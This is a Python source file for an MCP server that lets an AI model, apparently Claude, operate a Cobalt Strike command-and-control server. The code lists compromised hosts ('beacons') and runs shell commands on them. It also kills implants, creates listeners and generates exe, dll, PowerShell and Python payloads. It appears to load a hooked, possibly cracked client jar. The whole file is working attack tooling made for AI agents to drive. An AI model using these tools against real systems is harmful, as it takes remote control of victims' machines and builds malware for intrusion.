#!/usr/bin/env python3
"""
CS-MCP: Cobalt Strike MCP Server v1.1
======================================
Bridges Claude AI to Cobalt Strike via agscript (headless client).
Works with CS 4.8. No REST API required.

Key discovery: artifact_payload() works in headless mode!
artifact_stageless() hangs — it's GUI-only.
"""

import subprocess, os, sys, json, random, base64
from typing import Optional

# ================================================================
# Config (override via env vars)
# ================================================================
CS_DIR = os.environ.get("CS_DIR", r"D:\ct gongji\cs")
JAVA = os.environ.get("JAVA",
    r"C:\Users\MR\AppData\Roaming\.minecraft\runtime\java-runtime-delta\bin\java.exe")
CS_HOST = os.environ.get("CS_HOST", "127.0.0.1")
CS_PORT = os.environ.get("CS_PORT", "50050")
CS_PASS = os.environ.get("CS_PASS", "123")


def _esc(s) -> str:
    return str(s).replace("\\", "\\\\").replace('"', '\\"')


# ================================================================
# CNA Generator — Sleep code emitted per command
# ================================================================
def _cna(cmd: str, rf: str, args: dict = None) -> str:
    args = args or {}
    r = _esc(rf)

    def begin(): return [
        'on ready {',
        f'    $fh = openf(">" . "{r}");',
    ]
    def end(): return ['    closef($fh);', '    closeClient();', '}']
    def w(s): return [f'    writeb($fh, {s});']
    L = []

    if cmd == "list_listeners":
        L = begin() + w('"STATUS|ok\\n"') + [
            '    @names = listeners();',
        ] + w('"COUNT|" . size(@names) . "\\n"') + [
            '    foreach $n (@names) {',
            '        $i = listener_info($n);',
            '        writeb($fh, "L|" . $n . "|" . $i["payload"] . "|" . $i["host"] . "|" . $i["port"] . "|" . $i["beacons"] . "\\n");',
            '    }',
        ] + end()

    elif cmd == "list_beacons":
        L = begin() + w('"STATUS|ok\\n"') + [
            '    @b = beacons();',
        ] + w('"COUNT|" . size(@b) . "\\n"') + [
            '    foreach $x (@b) {',
            '        writeb($fh, "B|" . $x["id"] . "|" . $x["pid"] . "|" . $x["arch"] . "|" . $x["user"] . "|" . $x["computer"] . "|" . $x["internal"] . "|" . $x["external"] . "|" . $x["last"] . "|" . $x["note"] . "|" . $x["alive"] . "\\n");',
            '    }',
        ] + end()

    elif cmd == "get_beacon":
        bid = _esc(args.get("id", ""))
        L = begin() + [
            f'    $bid = "{bid}";', '    @b = beacons();', '    $f = 0;',
            '    foreach $x (@b) {',
            '        if ($bid eq "" . $x["id"]) {',
            '            writeb($fh, "STATUS|ok\\n");',
            '            writeb($fh, "B|" . $x["id"] . "|" . $x["pid"] . "|" . $x["arch"] . "|" . $x["user"] . "|" . $x["computer"] . "|" . $x["internal"] . "|" . $x["external"] . "|" . $x["last"] . "|" . $x["note"] . "|" . $x["alive"] . "\\n");',
            '            $f = 1; break;', '        }', '    }',
            f'    if ($f == 0) {{',
            f'        writeb($fh, "STATUS|error|Not found: {bid}\\n");',
            '    }',
        ] + end()

    elif cmd == "exec_beacon":
        bid, sc = _esc(args.get("id", "")), _esc(args.get("cmd", ""))
        L = begin() + [
            f'    $bid = "{bid}";', f'    $c = "{sc}";',
            '    @b = beacons();', '    $f = 0;',
            '    foreach $x (@b) {',
            '        if ($bid eq "" . $x["id"]) {',
            '            binput($bid, "[MCP] " . $c);',
            '            bshell($bid, $c);',
            f'            writeb($fh, "STATUS|ok|Sent: {sc}\\n");',
            '            $f = 1; break;', '        }', '    }',
            f'    if ($f == 0) {{ writeb($fh, "STATUS|error|Not found: {bid}\\n"); }}',
        ] + end()

    elif cmd == "beacon_note":
        bid, nt = _esc(args.get("id", "")), _esc(args.get("note", ""))
        L = begin() + [
            f'    $bid = "{bid}";', f'    $n = "{nt}";',
            '    @b = beacons();', '    $f = 0;',
            '    foreach $x (@b) {',
            '        if ($bid eq "" . $x["id"]) {',
            '            bnote($bid, $n);',
            f'            writeb($fh, "STATUS|ok|Noted\\n");',
            '            $f = 1; break;', '        }', '    }',
            f'    if ($f == 0) {{ writeb($fh, "STATUS|error|Not found: {bid}\\n"); }}',
        ] + end()

    elif cmd == "beacon_sleep":
        bid, sl, ji = _esc(args.get("id", "")), args.get("sleep", "5000"), args.get("jitter", "0")
        L = begin() + [
            f'    $bid = "{bid}";', f'    $s = {sl};', f'    $j = {ji};',
            '    @b = beacons();', '    $f = 0;',
            '    foreach $x (@b) {',
            '        if ($bid eq "" . $x["id"]) {',
            '            bsleep($bid, $s, $j);',
            '            writeb($fh, "STATUS|ok|Sleep: " . $s . "/" . $j . "\\n");',
            '            $f = 1; break;', '        }', '    }',
            f'    if ($f == 0) {{ writeb($fh, "STATUS|error|Not found: {bid}\\n"); }}',
        ] + end()

    elif cmd == "beacon_kill":
        bid = _esc(args.get("id", ""))
        L = begin() + [
            f'    $bid = "{bid}";', '    @b = beacons();', '    $f = 0;',
            '    foreach $x (@b) {',
            '        if ($bid eq "" . $x["id"]) {',
            '            bkill($bid);',
            f'            writeb($fh, "STATUS|ok|Killed\\n");',
            '            $f = 1; break;', '        }', '    }',
            f'    if ($f == 0) {{ writeb($fh, "STATUS|error|Not found: {bid}\\n"); }}',
        ] + end()

    elif cmd == "create_listener":
        nm, pl, ho = _esc(args.get("name", "")), _esc(args.get("payload", "")), _esc(args.get("host", "0.0.0.0"))
        po = args.get("port", "80")
        L = begin() + [
            f'    listener_create("{nm}", "{pl}", "{ho}", {po});',
            '    sleep(5000);',
            f'    $i = listener_info("{nm}");',
            f'    writeb($fh, "STATUS|ok|Created {nm}\\n");',
            f'    writeb($fh, "L|" . "{nm}" . "|" . "{pl}" . "|" . $i["host"] . "|" . ' + str(po) + ' . "|" . $i["beacons"] . "\\n");',
        ] + end()

    elif cmd == "delete_listener":
        L = begin() + [
            f'    writeb($fh, "STATUS|error|listener_remove unavailable in CS4.8 headless\\n");',
        ] + end()

    elif cmd == "generate_payload":
        ln, fm, ar = _esc(args.get("listener", "")), _esc(args.get("format", "raw")), _esc(args.get("arch", "x64"))
        L = begin() + [
            f'    $d = artifact_payload("{ln}", "{fm}", "{ar}");',
            '    if (strlen($d) > 0) {',
            '        writeb($fh, "STATUS|ok|" . strlen($d) . " bytes\\n");',
            '        writeb($fh, "B64|" . base64_encode($d) . "\\n");',
            '    } else {',
            f'        writeb($fh, "STATUS|error|Empty artifact_payload\\n");',
            '    }',
        ] + end()

    elif cmd == "get_listener_detail":
        nm = _esc(args.get("name", ""))
        L = begin() + [
            f'    $i = listener_info("{nm}");',
            '    writeb($fh, "STATUS|ok\\n");',
            '    writeb($fh, "LD|" . $i["name"] . "|" . $i["payload"] . "|" . $i["host"] . "|" . $i["port"] . "|" . $i["beacons"] . "|" . $i["althost"] . "|" . $i["bindto"] . "|" . $i["strategy"] . "\\n");',
        ] + end()

    else:
        L = begin() + [f'    writeb($fh, "STATUS|error|Unknown: {_esc(cmd)}\\n");'] + end()

    return "\n".join(L)


# ================================================================
# Runner
# ================================================================
def run(cmd: str, args: dict = None) -> dict:
    args = args or {}
    tag = random.randint(100000, 999999)
    cn, rn = f".mcp_{tag}.cna", f".mcp_{tag}.txt"

    for f in os.listdir(CS_DIR):
        if f.startswith(".mcp_"):
            try: os.remove(os.path.join(CS_DIR, f))
            except: pass

    with open(os.path.join(CS_DIR, cn), "w", encoding="utf-8") as f:
        f.write(_cna(cmd, rn, args))

    try:
        r = subprocess.run(
            [JAVA, "-javaagent:uHook.jar", "-classpath", "cobaltstrike-client.jar",
             "-Duser.language=en", "aggressor.headless.Start",
             CS_HOST, CS_PORT, f"mcp_{tag}", CS_PASS, cn],
            cwd=CS_DIR, capture_output=True, text=True, timeout=35)
        out = r.stdout + r.stderr
    except subprocess.TimeoutExpired:
        return {"success": False, "error": "timeout 35s"}
    finally:
        try: os.remove(os.path.join(CS_DIR, cn))
        except: pass

    try:
        with open(os.path.join(CS_DIR, rn), "r", encoding="utf-8") as f:
            content = f.read()
        os.remove(os.path.join(CS_DIR, rn))
    except FileNotFoundError:
        for line in out.split("\n"):
            if "already connected" in line:
                return {"success": False, "error": "User already connected"}
        return {"success": False, "error": "No output", "raw": out[-300:]}

    return _parse(content)


def _parse(content: str) -> dict:
    r = {"success": False, "data": []}
    for line in content.strip().split("\n"):
        parts = line.strip().split("|")
        if not parts: continue
        p = parts[0]
        if p == "STATUS":
            if parts[1] == "ok": r["success"] = True; r["message"] = parts[2] if len(parts) > 2 else ""
            else: r["error"] = parts[2] if len(parts) > 2 else "?"; return r
        elif p == "COUNT": r["count"] = int(parts[1])
        elif p == "L": r["data"].append({"name": parts[1], "payload": parts[2], "host": parts[3], "port": parts[4], "beacons": parts[5] if len(parts) > 5 else ""})
        elif p == "B": r["data"].append({"id": parts[1], "pid": parts[2], "arch": parts[3], "user": parts[4], "computer": parts[5], "internal": parts[6], "external": parts[7], "last": parts[8], "note": parts[9] if len(parts) > 9 else "", "alive": parts[10] if len(parts) > 10 else ""})
        elif p == "B64": r["b64"] = parts[1] if len(parts) > 1 else ""
        elif p == "LD": r["data"].append({"name": parts[1], "payload": parts[2], "host": parts[3], "port": parts[4], "beacons": parts[5], "althost": parts[6], "bindto": parts[7], "strategy": parts[8]})
    return r


# ================================================================
# Public API
# ================================================================
def list_listeners():                return run("list_listeners")
def list_beacons():                  return run("list_beacons")
def get_beacon(bid):                 return run("get_beacon", {"id": bid})
def exec_beacon(bid, cmd):           return run("exec_beacon", {"id": bid, "cmd": cmd})
def beacon_note(bid, note):          return run("beacon_note", {"id": bid, "note": note})
def beacon_sleep(bid, ms, j=0):      return run("beacon_sleep", {"id": bid, "sleep": ms, "jitter": j})
def beacon_kill(bid):                return run("beacon_kill", {"id": bid})
def create_listener(n, p, h, po):    return run("create_listener", {"name": n, "payload": p, "host": h, "port": po})
def delete_listener(n):              return run("delete_listener", {"name": n})
def get_listener_detail(n):          return run("get_listener_detail", {"name": n})

def generate_payload(listener, fmt="raw", arch="x64", output=None) -> dict:
    r = run("generate_payload", {"listener": listener, "format": fmt, "arch": arch})
    if r.get("success") and r.get("b64"):
        data = base64.b64decode(r["b64"])
        r["size"] = len(data)
        del r["b64"]
        if output:
            os.makedirs(os.path.dirname(output) or ".", exist_ok=True)
            with open(output, "wb") as f: f.write(data)
            r["saved_to"] = output
        else:
            r["b64"] = base64.b64encode(data).decode()
    return r


# ================================================================
# MCP Server (stdio)
# ================================================================
def serve():
    try:
        from mcp.server import Server; from mcp.server.stdio import stdio_server; from mcp.types import Tool, TextContent
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "mcp", "-q"], stdout=subprocess.DEVNULL)
        from mcp.server import Server; from mcp.server.stdio import stdio_server; from mcp.types import Tool, TextContent

    srv = Server("cs-mcp")

    @srv.list_tools()
    async def tools():
        return [
            Tool(name="cs_list_listeners", description="List all listeners with host/port/beacons",
                 inputSchema={"type": "object", "properties": {}, "required": []}),
            Tool(name="cs_list_beacons", description="List all active beacons with user/computer/IP",
                 inputSchema={"type": "object", "properties": {}, "required": []}),
            Tool(name="cs_get_beacon", description="Get beacon detail by ID",
                 inputSchema={"type": "object", "properties": {"beacon_id": {"type": "string"}}, "required": ["beacon_id"]}),
            Tool(name="cs_exec_beacon", description="Execute shell command on beacon",
                 inputSchema={"type": "object", "properties": {"beacon_id": {"type": "string"}, "command": {"type": "string"}}, "required": ["beacon_id", "command"]}),
            Tool(name="cs_beacon_sleep", description="Set beacon sleep(ms) and jitter(0-99)",
                 inputSchema={"type": "object", "properties": {"beacon_id": {"type": "string"}, "sleep_ms": {"type": "integer"}, "jitter": {"type": "integer"}}, "required": ["beacon_id", "sleep_ms"]}),
            Tool(name="cs_beacon_note", description="Add note to beacon",
                 inputSchema={"type": "object", "properties": {"beacon_id": {"type": "string"}, "note": {"type": "string"}}, "required": ["beacon_id", "note"]}),
            Tool(name="cs_beacon_kill", description="Kill a beacon",
                 inputSchema={"type": "object", "properties": {"beacon_id": {"type": "string"}}, "required": ["beacon_id"]}),
            Tool(name="cs_create_listener", description="Create listener. NOTE: HTTP Hosts field may need GUI verification.",
                 inputSchema={"type": "object", "properties": {"name": {"type": "string"}, "payload": {"type": "string"}, "host": {"type": "string"}, "port": {"type": "integer"}}, "required": ["name", "payload", "host", "port"]}),
            Tool(name="cs_delete_listener", description="Delete listener (GUI-only in CS 4.8)",
                 inputSchema={"type": "object", "properties": {"name": {"type": "string"}}, "required": ["name"]}),
            Tool(name="cs_get_listener_detail", description="Full listener config: host/beacons/althost/bindto/strategy",
                 inputSchema={"type": "object", "properties": {"name": {"type": "string"}}, "required": ["name"]}),
            Tool(name="cs_generate_payload", description="Generate payload via artifact_payload (headless-safe). Formats: raw,exe,dll,powershell,python",
                 inputSchema={"type": "object", "properties": {"listener": {"type": "string"}, "format": {"type": "string"}, "arch": {"type": "string"}, "output": {"type": "string"}}, "required": ["listener"]}),
        ]

    @srv.call_tool()
    async def call(name: str, args: dict):
        m = {
            "cs_list_listeners": list_listeners, "cs_list_beacons": list_beacons,
            "cs_get_beacon": lambda: get_beacon(args["beacon_id"]),
            "cs_exec_beacon": lambda: exec_beacon(args["beacon_id"], args["command"]),
            "cs_beacon_sleep": lambda: beacon_sleep(args["beacon_id"], args["sleep_ms"], args.get("jitter", 0)),
            "cs_beacon_note": lambda: beacon_note(args["beacon_id"], args["note"]),
            "cs_beacon_kill": lambda: beacon_kill(args["beacon_id"]),
            "cs_create_listener": lambda: create_listener(args["name"], args["payload"], args["host"], args["port"]),
            "cs_delete_listener": lambda: delete_listener(args["name"]),
            "cs_get_listener_detail": lambda: get_listener_detail(args["name"]),
            "cs_generate_payload": lambda: generate_payload(args["listener"], args.get("format", "raw"), args.get("arch", "x64"), args.get("output")),
        }
        try:
            result = m.get(name, lambda: {"error": f"Unknown: {name}"})()
        except Exception as e:
            result = {"success": False, "error": str(e)}
        return [TextContent(type="text", text=json.dumps(result, ensure_ascii=False, indent=2))]

    import asyncio
    async def _run():
        async with stdio_server() as (rs, ws):
            await srv.run(rs, ws, srv.create_initialization_options())
    asyncio.run(_run())


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "test":
        print("=== Listeners ===")
        print(json.dumps(list_listeners(), indent=2, ensure_ascii=False))
        print("=== Beacons ===")
        print(json.dumps(list_beacons(), indent=2, ensure_ascii=False))
    else:
        serve()
